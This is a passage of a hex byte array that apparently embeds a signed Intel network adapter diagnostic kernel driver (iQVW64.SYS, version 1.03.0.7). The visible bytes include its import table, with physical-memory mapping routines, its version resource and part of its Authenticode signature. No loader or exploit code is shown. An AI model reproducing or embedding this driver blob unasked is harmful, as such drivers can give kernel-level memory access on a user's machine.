		0xFF, 0xFF, 0x00, 0x00, 0x49, 0x23, 0xC0, 0x49, 0x0F, 0x44, 0xC1, 0x48, 0x89, 0x05, 0xBE, 0x4E, 0xA3, 0xFF, 0x48, 0xF7, 0xD0, 0x48, 0x89, 0x05, 0xAC, 0x4E, 0xA3, 0xFF, 0xE9, 0xB7, 0xFD, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x45, 0x6E, 0x74, 0x72, 0x79, 0x3A, 0x20, 0x43, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65,
		0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x6F, 0x76, 0x20, 0x31, 0x34, 0x20, 0x32, 0x30, 0x31, 0x33, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0x0A, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69,
		0x76, 0x65, 0x72, 0x20, 0x4C, 0x6F, 0x61, 0x64, 0x65, 0x64, 0x20, 0x2D, 0x2D, 0x20, 0x43, 0x6F, 0x6D, 0x70, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x25, 0x73, 0x20, 0x25, 0x73, 0x0A, 0x00, 0xCC, 0xCC, 0x30, 0x37, 0x3A, 0x32, 0x32, 0x3A, 0x34, 0x30,
		0x00, 0xCC, 0xCC, 0xCC, 0x30, 0x23, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5A, 0x27, 0x5D, 0x00, 0x18, 0x60, 0x00, 0x00, 0x18, 0x23, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x27, 0x5D, 0x00,
		0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE2, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xFA, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x48, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xB2, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC8, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE6, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8A, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x28, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x8E, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAC, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE2, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xEE, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4A, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x72, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5F, 0x01, 0x49, 0x6F, 0x44, 0x65, 0x6C, 0x65,
		0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x00, 0x00, 0x61, 0x01, 0x49, 0x6F, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x53, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x69, 0x63, 0x4C, 0x69, 0x6E, 0x6B, 0x00, 0x00, 0x3E, 0x04, 0x52, 0x74, 0x6C, 0x49,
		0x6E, 0x69, 0x74, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0x55, 0x01, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x53, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x69, 0x63, 0x4C, 0x69, 0x6E, 0x6B,
		0x00, 0x00, 0x4C, 0x01, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x00, 0x00, 0xF6, 0x01, 0x49, 0x6F, 0x66, 0x43, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74,
		0x00, 0x00, 0x46, 0x00, 0x45, 0x78, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x50, 0x6F, 0x6F, 0x6C, 0x57, 0x69, 0x74, 0x68, 0x54, 0x61, 0x67, 0x00, 0x58, 0x00, 0x45, 0x78, 0x46, 0x72, 0x65, 0x65, 0x50, 0x6F, 0x6F, 0x6C, 0x57, 0x69,
		0x74, 0x68, 0x54, 0x61, 0x67, 0x00, 0xC0, 0x02, 0x4D, 0x6D, 0x47, 0x65, 0x74, 0x50, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00, 0x31, 0x00, 0x44, 0x62, 0x67, 0x50, 0x72, 0x69, 0x6E, 0x74,
		0x00, 0x00, 0xCB, 0x05, 0x73, 0x74, 0x72, 0x6E, 0x63, 0x70, 0x79, 0x00, 0xD6, 0x05, 0x76, 0x73, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x66, 0x00, 0x00, 0x72, 0x01, 0x49, 0x6F, 0x46, 0x72, 0x65, 0x65, 0x4D, 0x64, 0x6C, 0x00, 0xD2, 0x02, 0x4D, 0x6D,
		0x4D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x79, 0x43, 0x61, 0x63, 0x68, 0x65, 0x00, 0x00, 0xB2, 0x02, 0x4D, 0x6D, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x4D, 0x64, 0x6C,
		0x46, 0x6F, 0x72, 0x4E, 0x6F, 0x6E, 0x50, 0x61, 0x67, 0x65, 0x64, 0x50, 0x6F, 0x6F, 0x6C, 0x00, 0x33, 0x01, 0x49, 0x6F, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x4D, 0x64, 0x6C, 0x00, 0xEE, 0x02, 0x4D, 0x6D, 0x55, 0x6E, 0x6D, 0x61,
		0x70, 0x49, 0x6F, 0x53, 0x70, 0x61, 0x63, 0x65, 0x00, 0x00, 0xEF, 0x02, 0x4D, 0x6D, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x00, 0x00, 0xAC, 0x02, 0x4D, 0x6D, 0x41, 0x6C, 0x6C, 0x6F,
		0x63, 0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x69, 0x67, 0x75, 0x6F, 0x75, 0x73, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x00, 0xBB, 0x02, 0x4D, 0x6D, 0x46, 0x72, 0x65, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x69, 0x67, 0x75, 0x6F, 0x75, 0x73,
		0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x00, 0xD0, 0x02, 0x4D, 0x6D, 0x4D, 0x61, 0x70, 0x49, 0x6F, 0x53, 0x70, 0x61, 0x63, 0x65, 0x00, 0x00, 0x52, 0x03, 0x4F, 0x62, 0x66, 0x44, 0x65, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x65,
		0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x00, 0x95, 0x02, 0x4B, 0x65, 0x57, 0x61, 0x69, 0x74, 0x46, 0x6F, 0x72, 0x53, 0x69, 0x6E, 0x67, 0x6C, 0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0xF5, 0x01, 0x49, 0x6F, 0x66, 0x43, 0x61, 0x6C,
		0x6C, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x00, 0x3E, 0x01, 0x49, 0x6F, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x53, 0x79, 0x6E, 0x63, 0x68, 0x72, 0x6F, 0x6E, 0x6F, 0x75, 0x73, 0x46, 0x73, 0x64, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x00, 0x00,
		0x2E, 0x02, 0x4B, 0x65, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0x25, 0x05, 0x5A, 0x77, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x21, 0x04, 0x52, 0x74, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x41,
		0x6E, 0x73, 0x69, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0xCE, 0x05, 0x73, 0x74, 0x72, 0x73, 0x74, 0x72, 0x00, 0x00, 0xB2, 0x04, 0x52, 0x74, 0x6C, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x54, 0x6F,
		0x41, 0x6E, 0x73, 0x69, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0x3C, 0x05, 0x5A, 0x77, 0x45, 0x6E, 0x75, 0x6D, 0x65, 0x72, 0x61, 0x74, 0x65, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x4B, 0x65, 0x79, 0x00, 0x4F, 0x05, 0x5A, 0x77, 0x4F, 0x70,
		0x65, 0x6E, 0x4B, 0x65, 0x79, 0x00, 0xDF, 0x05, 0x77, 0x63, 0x73, 0x6E, 0x63, 0x70, 0x79, 0x00, 0x7D, 0x01, 0x49, 0x6F, 0x47, 0x65, 0x74, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x50, 0x6F, 0x69, 0x6E, 0x74,
		0x65, 0x72, 0x00, 0x00, 0x7C, 0x01, 0x49, 0x6F, 0x47, 0x65, 0x74, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x49, 0x6E, 0x74, 0x65, 0x72, 0x66, 0x61, 0x63, 0x65, 0x73, 0x00, 0x4C, 0x03, 0x4F, 0x62, 0x52, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63,
		0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x42, 0x79, 0x50, 0x6F, 0x69, 0x6E, 0x74, 0x65, 0x72, 0x00, 0x00, 0x13, 0x02, 0x4B, 0x65, 0x42, 0x75, 0x67, 0x43, 0x68, 0x65, 0x63, 0x6B, 0x45, 0x78, 0x00, 0x00, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72,
		0x6E, 0x6C, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x3B, 0x00, 0x4B, 0x65, 0x53, 0x74, 0x61, 0x6C, 0x6C, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x6F, 0x72, 0x00, 0x3A, 0x00, 0x4B, 0x65,
		0x51, 0x75, 0x65, 0x72, 0x79, 0x50, 0x65, 0x72, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x6E, 0x63, 0x65, 0x43, 0x6F, 0x75, 0x6E, 0x74, 0x65, 0x72, 0x00, 0x48, 0x41, 0x4C, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
		0x01, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x09, 0x04, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x60, 0x30, 0x5D, 0x00, 0x94, 0x03, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x94, 0x03, 0x34, 0x00, 0x00, 0x00, 0x56, 0x00, 0x53, 0x00, 0x5F, 0x00, 0x56, 0x00, 0x45, 0x00, 0x52, 0x00, 0x53, 0x00, 0x49, 0x00, 0x4F, 0x00,
		0x4E, 0x00, 0x5F, 0x00, 0x49, 0x00, 0x4E, 0x00, 0x46, 0x00, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBD, 0x04, 0xEF, 0xFE, 0x00, 0x00, 0x01, 0x00, 0x03, 0x00, 0x01, 0x00, 0x07, 0x00, 0x00, 0x00, 0x02, 0x00, 0x05, 0x00, 0x26, 0x07, 0xCE, 0x0E,
		0x3F, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x04, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF2, 0x02, 0x00, 0x00, 0x01, 0x00, 0x53, 0x00, 0x74, 0x00, 0x72, 0x00,
		0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00, 0x00, 0x00, 0xCE, 0x02, 0x00, 0x00, 0x01, 0x00, 0x30, 0x00, 0x34, 0x00, 0x30, 0x00, 0x39, 0x00, 0x30, 0x00,
		0x34, 0x00, 0x42, 0x00, 0x30, 0x00, 0x00, 0x00, 0x46, 0x00, 0x13, 0x00, 0x01, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x70, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x79, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x20, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x70, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x7E, 0x00, 0x2B, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x44, 0x00, 0x65, 0x00, 0x73, 0x00, 0x63, 0x00, 0x72, 0x00, 0x69, 0x00, 0x70, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x28, 0x00, 0x52, 0x00, 0x29, 0x00, 0x20, 0x00, 0x4E, 0x00, 0x65, 0x00, 0x74, 0x00, 0x77, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x6B, 0x00, 0x20, 0x00, 0x41, 0x00, 0x64, 0x00, 0x61, 0x00,
		0x70, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x20, 0x00, 0x44, 0x00, 0x69, 0x00, 0x61, 0x00, 0x67, 0x00, 0x6E, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x74, 0x00, 0x69, 0x00, 0x63, 0x00, 0x20, 0x00, 0x44, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00,
		0x65, 0x00, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x00, 0x1A, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x31, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x33, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x37, 0x00, 0x20, 0x00, 0x62, 0x00, 0x75, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x74, 0x00, 0x20, 0x00, 0x62, 0x00, 0x79, 0x00, 0x3A, 0x00, 0x20, 0x00, 0x57, 0x00,
		0x69, 0x00, 0x6E, 0x00, 0x44, 0x00, 0x44, 0x00, 0x4B, 0x00, 0x00, 0x00, 0x36, 0x00, 0x0B, 0x00, 0x01, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00,
		0x65, 0x00, 0x00, 0x00, 0x69, 0x00, 0x51, 0x00, 0x56, 0x00, 0x57, 0x00, 0x36, 0x00, 0x34, 0x00, 0x2E, 0x00, 0x53, 0x00, 0x59, 0x00, 0x53, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x00, 0x3F, 0x00, 0x01, 0x00, 0x4C, 0x00, 0x65, 0x00, 0x67, 0x00,
		0x61, 0x00, 0x6C, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x79, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x00, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x79, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00,
		0x74, 0x00, 0x20, 0x00, 0x28, 0x00, 0x43, 0x00, 0x29, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x32, 0x00, 0x2D, 0x00, 0x32, 0x00, 0x30, 0x00, 0x31, 0x00, 0x33, 0x00, 0x20, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00,
		0x6C, 0x00, 0x20, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x70, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x20, 0x00, 0x41, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x20, 0x00, 0x52, 0x00, 0x69, 0x00,
		0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x73, 0x00, 0x20, 0x00, 0x52, 0x00, 0x65, 0x00, 0x73, 0x00, 0x65, 0x00, 0x72, 0x00, 0x76, 0x00, 0x65, 0x00, 0x64, 0x00, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3E, 0x00, 0x0B, 0x00, 0x01, 0x00, 0x4F, 0x00,
		0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x69, 0x00, 0x51, 0x00, 0x56, 0x00, 0x57, 0x00,
		0x36, 0x00, 0x34, 0x00, 0x2E, 0x00, 0x53, 0x00, 0x59, 0x00, 0x53, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x14, 0x00, 0x01, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x4E, 0x00, 0x61, 0x00,
		0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x28, 0x00, 0x52, 0x00, 0x29, 0x00, 0x20, 0x00, 0x69, 0x00, 0x51, 0x00, 0x56, 0x00, 0x57, 0x00, 0x36, 0x00, 0x34, 0x00, 0x2E, 0x00,
		0x53, 0x00, 0x59, 0x00, 0x53, 0x00, 0x00, 0x00, 0x36, 0x00, 0x09, 0x00, 0x01, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00,
		0x6E, 0x00, 0x00, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x33, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x37, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0x01, 0x00, 0x56, 0x00, 0x61, 0x00, 0x72, 0x00, 0x46, 0x00, 0x69, 0x00,
		0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x04, 0x00, 0x00, 0x00, 0x54, 0x00, 0x72, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00,
		0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x04, 0xB0, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x1F, 0x00, 0x00, 0x00, 0x02, 0x02, 0x00, 0x30, 0x82, 0x1E, 0xF8, 0x06, 0x09, 0x2A, 0x86,
		0x48, 0x86, 0xF7, 0x0D, 0x01, 0x07, 0x02, 0xA0, 0x82, 0x1E, 0xE9, 0x30, 0x82, 0x1E, 0xE5, 0x02, 0x01, 0x01, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02, 0x1A, 0x05, 0x00, 0x30, 0x4C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01,
		0x82, 0x37, 0x02, 0x01, 0x04, 0xA0, 0x3E, 0x30, 0x3C, 0x30, 0x17, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0F, 0x30, 0x09, 0x03, 0x01, 0x00, 0xA0, 0x04, 0xA2, 0x02, 0x80, 0x00, 0x30, 0x21, 0x30, 0x09, 0x06, 0x05,
		0x2B, 0x0E, 0x03, 0x02, 0x1A, 0x05, 0x00, 0x04, 0x14, 0x2C, 0xBF, 0xE4, 0xAD, 0x0E, 0x12, 0x31, 0xFF, 0x3E, 0x19, 0xC1, 0x9C, 0xA9, 0x31, 0x1D, 0x95, 0x2C, 0xE1, 0x70, 0xB7, 0xA0, 0x82, 0x19, 0xCE, 0x30, 0x82, 0x03, 0xEE, 0x30, 0x82, 0x03,
		0x57, 0xA0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x10, 0x7E, 0x93, 0xEB, 0xFB, 0x7C, 0xC6, 0x4E, 0x59, 0xEA, 0x4B, 0x9A, 0x77, 0xD4, 0x06, 0xFC, 0x3B, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05, 0x05, 0x00, 0x30,
		0x81, 0x8B, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x5A, 0x41, 0x31, 0x15, 0x30, 0x13, 0x06, 0x03, 0x55, 0x04, 0x08, 0x13, 0x0C, 0x57, 0x65, 0x73, 0x74, 0x65, 0x72, 0x6E, 0x20, 0x43, 0x61, 0x70, 0x65, 0x31, 0x14,
		0x30, 0x12, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x0B, 0x44, 0x75, 0x72, 0x62, 0x61, 0x6E, 0x76, 0x69, 0x6C, 0x6C, 0x65, 0x31, 0x0F, 0x30, 0x0D, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x06, 0x54, 0x68, 0x61, 0x77, 0x74, 0x65, 0x31, 0x1D, 0x30,
		0x1B, 0x06, 0x03, 0x55, 0x04, 0x0B, 0x13, 0x14, 0x54, 0x68, 0x61, 0x77, 0x74, 0x65, 0x20, 0x43, 0x65, 0x72, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31, 0x1F, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x16, 0x54,
		0x68, 0x61, 0x77, 0x74, 0x65, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x73, 0x74, 0x61, 0x6D, 0x70, 0x69, 0x6E, 0x67, 0x20, 0x43, 0x41, 0x30, 0x1E, 0x17, 0x0D, 0x31, 0x32, 0x31, 0x32, 0x32, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5A, 0x17, 0x0D,
